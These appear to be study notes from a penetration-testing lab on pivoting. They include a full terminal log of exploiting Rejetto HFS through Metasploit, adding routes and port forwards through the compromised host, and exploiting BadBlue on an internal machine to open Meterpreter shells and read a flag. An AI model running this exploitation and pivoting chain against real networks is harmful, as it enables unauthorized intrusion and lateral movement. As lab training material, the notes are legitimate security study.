- Pivoting is a post exploitation technique that involves utilizing a compromised host that is connected to multiple networks to gain access to systems within other networks.
- After gaining access to one host, we can use the compromised host to exploit other hosts on a private internal network to which we could not access previously
- Meterpreter provides us with the ability to add a network route to the internal networks subnet, perform port forwarding and consequently scan and exploit other systems on the network.

Port forwarding

- Port forwarding is the process of redirecting traffic from a specific port on a target system to a specific port on our system
- In the context of pivoting, we can forward a remote port on a previously inaccessile host to a local port on our Kali Linux System so that we can remotely interact/exlploit the service running on the port

![[Pasted image 20230826171552.png]]

Lab details:

- It is GUI based kali machine and we have got two IP addresses in the target.txt file and we will only be able to access one system where as we do not have access to the other target IP and the only way we can get access is through the victim 1.
- Here is how the process follows
	1. Run an nmap service versioning scan on the target that we do have access to.
		- We have got HttpFileServer running on port 80 on this system
		- Open browser and we can see it is running Rejetto http file server
		- We know that a module is present in metasploit for this particular version of the file server we can also get some codes from searchsploit as well
		- Launch the msfconsole and search for rejetto and use the module exploit/windows/http/rejetto_hfs_exec
		- Set the options needed and run the module once we got the meterpreter session perform some local enumeration getting to know the current user that you are logged in as and the privileges that you have as well using the command `sysinfo` and `getuid`.
		- Run the `ipconfig` command we can see it has got other loop back device and the network range as well
		- We need to add a route now and the command is `run autoroute -s {targetIPwith0/subnet}`
	2. We can runn the command `run autoroute -p` to get the routing table
		- Put the session in background
		- Search for the port scanner use auxiliary/scanner/portscan/tcp module for this
		- And set the rhosts value to the other target IP which we have got as we have performed the autoroute we will be able to get the results now.
		- We got that port 80 is open now we need to perform port forwarding and the command for that is `portfwd add -l 1234 -p {remotePort} -r {targetIP2}` once the command is executed we will be able to access the port 80 of the target 2 on our kali system port 1234 you need to run the command from the session1 we got from target1
		- Open a new terminal and perform a nmap scan on port 1234 on localhost `nmap -sV -p 1234 localhost`
		- We got the info that it is running Badblue 2.7,now that we know that we can exploit it from within the msfconsole as we have got a module to exploit badblue
		- Set the session in background
		- search badblue use exploit/windows/http/badblue_passthru set the options in here
			- set the payload -> we cannot use the reverse tcp payload instead we need to use the bind tcp paylaod as it needs to route through some IP's in between
			- set paylaod windows/meterpreter/bind_tcp
			- set target ip of target2
			- exploit
		- We have successfully exploited the target 2 now

```
root@attackdefense:~# ping -c 5 10.5.21.237
PING 10.5.21.237 (10.5.21.237) 56(84) bytes of data.
64 bytes from 10.5.21.237: icmp_seq=1 ttl=125 time=2.21 ms
64 bytes from 10.5.21.237: icmp_seq=2 ttl=125 time=1.69 ms
64 bytes from 10.5.21.237: icmp_seq=3 ttl=125 time=1.86 ms
64 bytes from 10.5.21.237: icmp_seq=4 ttl=125 time=1.67 ms
64 bytes from 10.5.21.237: icmp_seq=5 ttl=125 time=1.81 ms

--- 10.5.21.237 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.665/1.846/2.207/0.195 ms
root@attackdefense:~# ping -c 5 10.5.30.215
PING 10.5.30.215 (10.5.30.215) 56(84) bytes of data.

--- 10.5.30.215 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4084ms

root@attackdefense:~# nmap -sV 10.5.21.237
Starting Nmap 7.91 ( https://nmap.org ) at 2023-08-26 18:25 IST
Nmap scan report for 10.5.21.237
Host is up (0.0015s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
49176/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.88 seconds
root@attackdefense:~# msfconsole
       =[ metasploit v6.1.0-dev                           ]
+ -- --=[ 2160 exploits - 1146 auxiliary - 367 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<pa
                                         th>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t
                                         he local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.5.21.237
rhosts => 10.5.21.237
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/HgheiuqlRQpQW
[*] Local IP: http://10.10.12.2:8080/HgheiuqlRQpQW
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HgheiuqlRQpQW
[*] Sending stage (175174 bytes) to 10.5.21.237
[!] Tried to delete %TEMP%\IzRgNFprTBqaQo.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.21.237:49225) at 2023-08-26 18:28:57 +0530
[*] Server stopped.

meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:e5:d5:4e:c2:68
MTU          : 9001
IPv4 Address : 10.5.21.237
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::913a:3f59:88a8:242e
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 24
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a05:15ed
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

meterpreter > run autoroute -s 10.5.21.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.5.21.0/255.255.240.0...
[+] Added route to 10.5.21.0/255.255.240.0 via 10.5.21.237
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.5.21.0          255.255.240.0      Session 1

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/rejetto_hfs_exec) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(windows/http/rejetto_hfs_exec) > use 5
msf6 auxiliary(scanner/portscan/tcp) > optios
[-] Unknown command: optios
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in millisecond
                                           s.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<
                                           path>'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set rhosts 10.5.30.215
rhosts => 10.5.30.215
msf6 auxiliary(scanner/portscan/tcp) > set ports 1-100
ports => 1-100
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.5.30.215:          - 10.5.30.215:80 - TCP OPEN
[*] 10.5.30.215:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > portfwd add -l 1234 -p 80 -r 10.5.30.215
[-] Unknown command: portfwd
msf6 auxiliary(scanner/portscan/tcp) > sessions

Active sessions
===============

  Id  Name  Type                     Information                               Connection
  --  ----  ----                     -----------                               ----------
  1         meterpreter x86/windows  WIN-OMCNBKR66MN\Administrator @ WIN-OMCN  10.10.12.2:4444 -> 10.5.21.237:49225 (10
                                     BKR66MN                                   .5.21.237)

msf6 auxiliary(scanner/portscan/tcp) > sessions 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 1234 -p 80 -r 10.5.30.215
[*] Local TCP relay created: :1234 <-> 10.5.30.215:80
meterpreter > 
Background session 1? [y/N]  
msf6 auxiliary(scanner/portscan/tcp) > search badblue

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 auxiliary(scanner/portscan/tcp) > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path
                                       >'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > set rhost 10.5.30.215
rhost => 10.5.30.215
msf6 exploit(windows/http/badblue_passthru) > run

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.5.30.215:4444
[*] Sending stage (175174 bytes) to 10.5.30.215
[*] Meterpreter session 2 opened (10.5.21.237:49363 -> 10.5.30.215:4444) at 2023-08-26 18:35:03 +0530

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2018-09-15 12:49:00 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-11-14 12:26:16 +0530  BOOTNXT
40777/rwxrwxrwx   8192    dir   2018-11-14 12:26:15 +0530  Boot
40777/rwxrwxrwx   0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
40777/rwxrwxrwx   0       dir   2018-11-14 12:26:17 +0530  EFI
40777/rwxrwxrwx   0       dir   2018-09-15 12:49:00 +0530  PerfLogs
40555/r-xr-xr-x   4096    dir   2018-09-15 12:49:00 +0530  Program Files
40777/rwxrwxrwx   4096    dir   2018-09-15 12:49:00 +0530  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2018-09-15 12:49:00 +0530  ProgramData
40777/rwxrwxrwx   0       dir   2018-11-15 05:37:05 +0530  Recovery
40777/rwxrwxrwx   4096    dir   2020-11-07 06:12:12 +0530  System Volume Information
40555/r-xr-xr-x   4096    dir   2018-09-15 11:39:26 +0530  Users
40777/rwxrwxrwx   16384   dir   2018-09-15 11:39:26 +0530  Windows
100444/r--r--r--  408692  fil   2018-11-14 12:26:16 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2021-04-07 13:33:04 +0530  flag.txt
0000/---------    0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag.txt 
meterpreter >c46d12f28d87ae0b92b05ebd9fb8e817
```

